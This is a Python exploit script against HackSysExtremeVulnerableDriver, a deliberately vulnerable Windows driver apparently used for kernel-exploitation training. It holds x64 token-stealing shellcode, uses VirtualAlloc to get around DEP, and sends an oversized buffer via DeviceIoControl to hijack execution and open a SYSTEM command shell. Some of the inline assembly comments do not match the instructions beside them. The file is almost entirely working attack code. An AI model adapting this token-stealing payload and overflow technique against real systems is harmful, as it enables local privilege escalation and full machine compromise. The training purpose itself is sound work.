import ctypes, sys, struct
from subprocess import *
from ctypes import *


#Set the kernel dll
kernel32 = windll.kernel32
hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)

if not hevDevice or hevDevice == -1:
		print '[+] Could not get handle. [*]'
		sys.exit(0)


#This will define the CTL_CODE
ctl_code = hex((0x00000022 << 16) | (0x00000000 << 14) | (0x800 << 2) | 0x00000003)
print "\n[*]     CTL code is: " + ctl_code + "      [*]" 

#System Token Stealing Payload
print "[*]     Stealing SYSTEM Token      [*]"



shellcode = bytearray(
	"\x48\x31\xc0" 					# 	xorq	%rax, %rax      | xor rax, rax			; Zero Out RAX
	"\x65\x48\x8b\x04\x25\x88\x01\x00\x00"  	# 	movq	%gs:392, %rax   | mov rax, [gs:188h]           	; Get nt!_KPCR.PcrbData.CurrentThread
	"\x48\x8b\x40\x70"				# 	movq	112(%rax), %rax	| mov rcx, rax                 	; Copy current process _EPROCESS structure
	"\x48\x89\xc1"					# 	movq	%rax, %rcx	| mov r11, rcx                 	; Store Token.RefCnt
	"\x49\x89\xcb"					# 	movq	%rcx, %r11	| mov r11, rcx                 	; Store Token.RefCnt
	"\x49\x83\xe3\x07"				# 	andq	$7, %r11	| and r11, 7		
	"\xba\x04\x00\x00\x00"				# 	movl	$4, %edx	| mov rdx, 4h                  	; WIN 7 SP1 SYSTEM process PID = 0x4
	"\x48\x8b\x80\x88\x01\x00\x00"			# 	movq	392(%rax), %rax	| mov rax, [rax + 188h]        	; Get nt!_EPROCESS.ActiveProcessLinks.Flink
	"\x48\x2d\x88\x01\x00\x00"			# 	subq	$392, %rax	| sub rax, 188h
	"\x48\x39\x90\x80\x01\x00\x00"			# 	cmpq	%rdx, 384(%rax)	| cmp[rax + 180h], rdx         	; Get nt!_EPROCESS.UniqueProcessId
	"\x75\xea"					# 	jne	-22 <.text+0x1f>| mov rdx, [rax + 208h]        	; Get SYSTEM process nt!_EPROCESS.Token
	"\x48\x8b\x90\x08\x02\x00\x00" 			#	movq	520(%rax), %rdx	| and rdx, 0fffffffffffffff0h	
	"\x48\x83\xe2\xf0"				# 	andq	$-16, %rdx	| or rdx, r11	
	"\x4c\x09\xda"					# 	orq	%r11, %rdx			
	"\x48\x89\x91\x08\x02\x00\x00"			# 	movq	%rdx, 520(%rcx)	| mov[rcx + 208h], rdx         	; Replace target process nt!_EPROCESS.Token
	"\x48\x83\xc4\x28" 				#	addq	$40, %rsp	| add rsp, 28			; Align the Stack
	"\xc3"						# 	retq
)

#---------------------------------------------------------[Structure]-#
# LPVOID WINAPI VirtualAlloc(         => PTR to VirtualAlloc          #
#   _In_opt_  LPVOID lpAddress,       => None                         #
#   _In_      SIZE_T dwSize,          => dwSize (??) Shellcode Length #
#   _In_      DWORD flAllocationType, => flAllocationType (0x3000)    #
#   _In_      DWORD flProtect         => flProtect (0x40) Page Execute#
# );                                                                  #
#---------------------------------------------------------------------#
print "[*]  VirtualAlloc() to Bypass DEP  [*]"
ptr = kernel32.VirtualAlloc(c_int(0),c_int(len(shellcode)),c_int(0x3000),c_int(0x40))
buff = (c_char * len(shellcode)).from_buffer(shellcode)
kernel32.RtlMoveMemory(c_int(ptr),buff,c_int(len(shellcode)))
final_exploit = struct.pack("<Q",ptr)

print "[*]      Sending Buffer!!!         [*]"

RDI = "B"*8
STACK = "C"*8
RBX = "D"*8
RSI = "E"*8

exploit = 'A' * 2048 + RDI + final_exploit
explLength = len(exploit)

kernel32.DeviceIoControl(hevDevice, 0x222003, exploit, explLength, None, 0, byref(c_ulong()), None)
print "[*]   Popping a NT/System Shell!!! [*]"
Popen("start cmd", shell=True)
